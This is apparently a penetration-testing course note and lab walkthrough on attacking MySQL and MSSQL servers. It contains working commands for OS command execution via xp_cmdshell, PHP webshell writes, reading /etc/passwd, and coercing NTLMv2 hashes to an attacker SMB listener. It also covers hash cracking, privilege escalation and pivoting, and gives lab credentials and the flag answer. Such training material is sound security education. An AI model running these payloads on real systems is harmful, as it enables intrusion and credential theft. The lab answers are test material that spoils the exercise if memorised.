# 09 — Attacking SQL Databases

## Overview

MySQL and MSSQL are high-value targets because they often contain:

- Credentials and password hashes
- PII and business data
- API keys, tokens, and internal configuration
- Privileged service accounts that can be abused for lateral movement

If we compromise SQL access, the objective is not only data theft, but also privilege escalation, command execution, and pivoting.

---

## Port and Service Reference

| Service | Default Ports | Notes |
|---------|----------------|------|
| MSSQL | TCP/1433, UDP/1434 | SQL Server Browser commonly on 1434 |
| MSSQL Hidden Mode | TCP/2433 | Alternate deployment mode |
| MySQL | TCP/3306 | MariaDB commonly uses same port |

---

## Fast Enumeration Workflow

### 1. Identify DB Service and Version

```bash
nmap -Pn -sV -sC -p1433,3306 10.10.10.125
```
> `-Pn` skips ping (useful when ICMP is blocked), `-sV` detects versions, `-sC` runs default scripts. Scans both MSSQL (1433) and MySQL (3306) in one command. Replace the IP.

What to extract immediately:

- Product/version (`Microsoft SQL Server 2017`, `MySQL 8.x`, etc.)
- Host/domain naming (`DNS_Domain_Name`, `NetBIOS_Computer_Name`)
- TLS/cert metadata
- Any version-specific vuln opportunities

### 2. Fingerprint for Misconfiguration Risk

Look for:

- Anonymous or weak/default credentials
- SQL auth enabled unnecessarily
- Old MySQL versions vulnerable to auth issues (e.g., CVE-2012-2122 class)
- Over-privileged DB accounts

---

## Authentication Models

### MSSQL

| Mode | Description |
|------|-------------|
| Windows Authentication | Integrated with AD/Windows trust model |
| Mixed Mode | Windows auth + SQL local usernames/passwords |

### MySQL

| Method | Description |
|--------|-------------|
| Username/Password | Standard auth model |
| Windows auth plugin | Optional, environment-dependent |

Misconfiguration in auth mode selection or account policy is often the real attack surface.

---

## Initial Access Commands

### MySQL from Linux

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```
> No space between `-p` and the password. `-u` is the username, `-h` is the remote host. Replace all three with your target's values.

### MSSQL with sqlcmd (Windows)

```powershell
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
> `-S` is the server name or IP, `-U` is the SQL login, `-P` is the password. `-y 30 -Y 30` sets column width for readable output. Replace the server, username, and password.

### MSSQL from Linux with sqsh

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
> `-h` suppresses column headers. End each SQL statement with `go` to execute. Replace the IP, username, and password.

### MSSQL with Impacket

```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```
> Impacket's interactive MSSQL client. Format is `user@IP`. `-p` specifies the port if non-standard. You'll be prompted for the password.

### MSSQL Windows Auth from Linux (sqsh)

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
> The `.\\` prefix means local Windows authentication (not SQL auth). Use this when the account is a Windows local user, not a SQL login. Double backslash escapes the shell.

Use host/domain prefixes when you want Windows auth instead of SQL-auth local users.

---

## Default Databases to Know

### MySQL System Schemas

- `mysql`
- `information_schema`
- `performance_schema`
- `sys`

### MSSQL System Databases

- `master`
- `msdb`
- `model`
- `resource`
- `tempdb`

These are essential for metadata and privilege mapping, even when they do not contain business data.

---

## Data Discovery and Extraction

### Show Databases

```sql
-- MySQL
SHOW DATABASES;

-- MSSQL
SELECT name FROM master.dbo.sysdatabases;
GO
```
> Run this immediately after connecting to map the attack surface. Note any non-default databases — they likely hold business data, credentials, or application secrets.

### Select Database

```sql
-- MySQL
USE htbusers;

-- MSSQL
USE htbusers;
GO
```
> Switch context to the target database before running table queries. Replace `htbusers` with the database name from the previous step.

### Show Tables

```sql
-- MySQL
SHOW TABLES;

-- MSSQL
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES;
GO
```
> Lists all tables in the current database. Look for `users`, `accounts`, `admins`, `tokens`, and `connections` — those are the most likely to contain credentials.

### Dump Sensitive Table

```sql
-- MySQL
SELECT * FROM users;

-- MSSQL
SELECT * FROM users;
GO
```
> Dumps all rows and columns from the target table. Replace `users` with the table name found above. Look for password hashes, API keys, or plaintext passwords.

Focus table triage on likely high-value names:

- `users`, `accounts`, `admins`, `auth`, `tokens`, `apikeys`, `settings`, `connections`

---

## Command Execution via MSSQL

`xp_cmdshell` is one of the highest-impact post-auth features.

### Check/Use xp_cmdshell

```sql
xp_cmdshell 'whoami';
GO
```
> Try this first — if it returns output, xp_cmdshell is already enabled and you have OS command execution. Replace `whoami` with any OS command.

### Enable xp_cmdshell (if privileged)

```sql
EXECUTE sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXECUTE sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO
```
> Run each statement separately, ending with `go`. First enable advanced options, then enable xp_cmdshell, and reconfigure after each. Requires sysadmin or elevated privileges.

Important behavior:

- Disabled by default
- Runs as SQL Server service account
- Synchronous execution (caller waits for command completion)

---

## File Write Abuse

### MySQL Webshell Write

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```
> `INTO OUTFILE` writes the SELECT result to a file on the server. Replace the path with the webroot directory. Requires the FILE privilege and `secure_file_priv` must allow writes to that path.

### Check `secure_file_priv`

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
> Shows whether MySQL restricts file read/write to a specific directory. An empty value means unrestricted. `NULL` means file operations are disabled entirely.

Interpretation:

- Empty value: broad read/write allowed (high risk)
- Directory path: file ops constrained to that directory
- `NULL`: import/export disabled

### MSSQL File Write via OLE Automation

Enable feature:

```sql
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
```
> Requires sysadmin. Enables OLE Automation, which lets MSSQL call Windows scripting objects. Run each block and `go` before the next.

Create file:

```sql
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
GO
```
> Writes a PHP webshell to the IIS webroot. Replace the destination path (`c:\inetpub\wwwroot\`) with the actual web server root and adjust the shell content as needed.

---

## File Read Abuse

### MSSQL Arbitrary File Read

```sql
SELECT *
FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
GO
```
> `OPENROWSET(BULK ...)` reads a file as a single text blob. Replace the path with any file you want to read. Requires `ADMINISTER BULK OPERATIONS` or sysadmin.

### MySQL File Read

```sql
SELECT LOAD_FILE('/etc/passwd');
```
> Reads a local file and returns its contents as a string. Requires the FILE privilege. Replace the path with any file on the server. Returns NULL if the file is inaccessible.

MySQL read success depends on FILE privilege, server config, and filesystem permissions.

---

## Capture MSSQL Service Account Hash

MSSQL can be coerced into SMB authentication by querying UNC paths.

### Trigger with xp_dirtree / xp_subdirs

```sql
EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\';
GO

EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\';
GO
```
> Forces the SQL Server to authenticate to your SMB listener and reveals the NTLMv2 hash of the SQL service account. Replace `10.10.110.17` with your tun0 IP. Start Responder first.

### Listener Options

```bash
sudo responder -I tun0
```
> Captures the incoming NTLMv2 auth from the SQL server. `-I tun0` sets the listening interface. Run this before executing xp_dirtree. The hash saves to `/usr/share/responder/logs/`.

```bash
sudo impacket-smbserver share ./ -smb2support
```
> Alternative to Responder for capturing SMB auth. Creates a share named `share` in the current directory. `-smb2support` handles SMBv2 connections. Use when Responder conflicts with other tools.

If outbound SMB is possible, you may capture NTLMv2 from the SQL service identity for crack or relay workflows.

---

## Impersonation Privilege Escalation (MSSQL)

### Find Impersonation Paths

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO
```
> Returns any login that your current user has permission to impersonate. If `sa` or another sysadmin appears, you can escalate immediately.

### Check Current Role

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```
> `SYSTEM_USER` shows your current login name. `IS_SRVROLEMEMBER('sysadmin')` returns 1 if you're a sysadmin, 0 if not. Run this before and after impersonation to confirm the privilege change.

### Impersonate High-Privilege Login

```sql
USE master;
GO
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```
> `EXECUTE AS LOGIN` switches your session context to the named login. Replace `sa` with any login returned by the impersonation query. Verify with `IS_SRVROLEMEMBER` that you now have sysadmin.

Revert context:

```sql
REVERT;
GO
```
> Returns your session to the original login context. Always revert when you no longer need the elevated session.

---

## Linked Server Pivoting (MSSQL)

### Enumerate Linked Servers

```sql
SELECT srvname, isremote FROM sysservers;
GO
```
> Lists all linked servers. `isremote = 1` means it's a remote linked server. Each one is a potential lateral movement target.

### Execute Pass-through Query

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')')
AT [10.0.0.12\\SQLEXPRESS];
GO
```
> `AT [server]` runs the query on the linked server. Replace `10.0.0.12\\SQLEXPRESS` with the linked server name from `sysservers`. Check `is_srvrolemember('sysadmin')` — if it returns 1, you have immediate sysadmin on that box.

If linked credentials are privileged, this becomes direct lateral movement into another SQL host.

---

## Attack Chain Cheat Sheet

1. Enumerate ports/version with Nmap
2. Authenticate using any valid SQL or Windows-integrated creds
3. Enumerate DBs/tables and extract credential material
4. Check execution primitives (`xp_cmdshell`, OLE, UDF paths)
5. Read local secrets/config files
6. Coerce SMB auth to capture service hash
7. Abuse `IMPERSONATE` to reach `sysadmin`
8. Pivot through linked servers
9. Use new privileges for host-level access and lateral movement

---

## Key Takeaways

| Concept | Practical Meaning |
|---------|-------------------|
| Service enumeration | Version + naming metadata drives exploit/misconfig strategy |
| Auth mode matters | Mixed mode and weak SQL users dramatically expand attack surface |
| SQL access != limited impact | With enough privilege, SQL often becomes OS command execution |
| File primitives are dangerous | Read/write features can become shell access rapidly |
| SMB coercion from MSSQL | `xp_dirtree`/`xp_subdirs` can leak service NTLMv2 hashes |
| IMPERSONATE privilege | Frequently overlooked direct path to `sysadmin` |
| Linked servers | Built-in lateral movement channel inside enterprise SQL estates |

---

## Operator Notes

- Prefer targeted, low-noise queries before heavy dumps.
- Always validate current context (`SYSTEM_USER`, role membership).
- Prioritize credential-bearing tables and configuration secrets first.
- Treat SQL service accounts as lateral movement launch points.
- Log every privilege change (`xp_cmdshell`, OLE enablement, impersonation) for clean reporting.

---

## Lab Walkthrough — ACADEMY-ATTCOMSVC-WIN-02 (10.129.203.12)

End-to-end attack chain executed against the "Attacking SQL Databases" skills lab. Demonstrates the canonical low-priv MSSQL → NTLMv2 capture → service-account takeover → restricted-DB pivot pattern.

### Target Profile

| Item | Value |
|------|-------|
| Target | `10.129.203.12` (`WIN-02`) |
| Service | MSSQL Server 2019 RTM (15.0.2000) |
| Instance | `WIN-02\SQLEXPRESS` on port `1433` |
| Initial creds | `htbdbuser:MSSQLAccess01!` (SQL auth, low priv) |
| Operator | Kali, `tun0 = 10.10.17.176` |

### Step 1 — Initial Authenticated Enumeration

```bash
impacket-mssqlclient htbdbuser:'MSSQLAccess01!'@10.129.203.12 -windows-auth
# Drop -windows-auth for SQL auth users; this lab uses SQL auth.
impacket-mssqlclient htbdbuser:'MSSQLAccess01!'@10.129.203.12
```
> Use `-windows-auth` for Windows/domain accounts. Omit it for SQL-local logins. Format is `user:'pass'@IP`. Replace the credentials and IP with your target's values.

Inside the MSSQL shell:

```sql
SELECT name FROM sys.databases;
-- master, tempdb, model, msdb, hmaildb, flagDB

SELECT name, suser_sname(owner_sid) AS owner FROM sys.databases;
-- flagDB owned by WINSRV02\Administrator
-- hmaildb owned by hmaildblogin

SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 (not sysadmin)
SELECT SYSTEM_USER, ORIGINAL_LOGIN();  -- htbdbuser
```

`htbdbuser` had only `CONNECT SQL` + `VIEW ANY DATABASE`. Direct `USE flagDB` was denied, so a privilege escalation path was needed.

### Step 2 — Coerce SMB Auth from MSSQL Service (`xp_dirtree`)

The MSSQL service runs as `mssqlsvc`. Forcing the SQL Server to access an attacker-controlled UNC path leaks the service-account NTLMv2 hash.

```bash
# Operator: clear port 445 first (kill any running ntlmrelayx / smbd).
sudo ss -tlnp | grep :445
sudo kill <PID>          # kill conflicting service
sudo responder -I tun0 -wv
```
> `ss -tlnp` shows listening TCP ports with PIDs. Kill anything on 445 before starting Responder or it won't bind. `-w` enables WPAD (Web Proxy Auto-Discovery) capture, `-v` is verbose.

In MSSQL session (any low-priv user can run this):

```sql
EXEC master..xp_dirtree '\\10.10.17.176\share\', 1, 1;
-- xp_subdirs is an alternate primitive: EXEC master..xp_subdirs '\\10.10.17.176\share\';
```
> Replace `10.10.17.176` with your tun0 IP. The SQL Server reaches out over SMB to your listener and sends the service account's NTLMv2 hash automatically. No sysadmin required.

Responder captures NTLMv2:

```
[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : MSSQLSVC::WIN-02:<challenge>:<HMAC>:<blob>
```

Save it:

```bash
cat > /tmp/mssqlsvc_ntlmv2.hash <<'EOF'
MSSQLSVC::WIN-02:...full hash from responder...
EOF
```
> Copy the full NTLMv2 hash line from Responder's output into this file. The heredoc preserves special characters. Replace the placeholder with the actual hash string.

### Step 3 — Crack the NTLMv2 Hash

```bash
# Targeted list first (failed in this lab)
hashcat -m 5600 /tmp/mssqlsvc_ntlmv2.hash /tmp/pws.list --quiet
# Fallback to rockyou (cracked here)
hashcat -m 5600 /tmp/mssqlsvc_ntlmv2.hash /usr/share/wordlists/rockyou.txt --quiet
hashcat -m 5600 /tmp/mssqlsvc_ntlmv2.hash --show
# MSSQLSVC::WIN-02:...:princess1
```
> `-m 5600` is NTLMv2 mode. `--quiet` suppresses progress output. Try your loot wordlist first before rockyou. `--show` displays the cracked result after the run completes.

Recovered plaintext: **`princess1`**.

### Step 4 — Reauthenticate as `mssqlsvc` (Windows Auth)

```bash
impacket-mssqlclient 'WIN-02/mssqlsvc:princess1@10.129.203.12' -windows-auth
```
> Use `DOMAIN/user:pass@host` format for Windows auth. `-windows-auth` is required for Windows local/domain accounts. Replace `WIN-02`, `mssqlsvc`, the password, and the IP with your target's values.

Critical syntax notes:

- Use `DOMAIN/user:pass@host` form — host name `WIN-02` works because the service account is local to the box.
- `-windows-auth` is mandatory; `mssqlsvc` is a Windows account, not a SQL login.
- Avoid feeding heredocs from zsh with custom `precmd` hooks — they pollute stdin. Use `/bin/sh -c '...'` and `printf "QUERY;\nexit\n" | impacket-mssqlclient ...` for non-interactive runs.

### Step 5 — Enumerate `flagDB` and Extract the Flag

```sql
-- list user tables
SELECT name FROM flagDB.sys.tables;
-- name
-- -------
-- tb_flag

-- read it
SELECT * FROM flagDB.dbo.tb_flag;
-- flagvalue
-- ---------------------------------
-- HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```

### Lab Answers

| Question | Answer |
|----------|--------|
| Q1 — `mssqlsvc` password | `princess1` |
| Q2 — flagDB flag | `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}` |

### Lessons Learned

- `VIEW ANY DATABASE` is enough to map the attack surface even without `USE` rights — always enumerate `sys.databases` and owners first.
- `xp_dirtree` / `xp_subdirs` are reachable by **any** authenticated SQL user; they do not require sysadmin. Default-deny on outbound SMB from DB servers neutralizes this.
- Service-account passwords (`mssqlsvc`, `sqlservice`, etc.) are frequent rockyou hits. Spray with wordlists in priority order: targeted → small custom → rockyou.
- Free port 445 before launching Responder — `ntlmrelayx`, `smbd`, or stale Responder instances will silently absorb the captured auth.
- Non-interactive mssqlclient runs work cleanly via `/bin/sh -c 'printf "QUERY;\nexit\n" | impacket-mssqlclient ...'` to bypass shell hooks that interfere with stdin.
- After cracking the service account, reconnect with `-windows-auth`; the new session typically inherits enough rights (often `sysadmin` or DB-owner adjacent) to read every database the original SQL login could not touch.
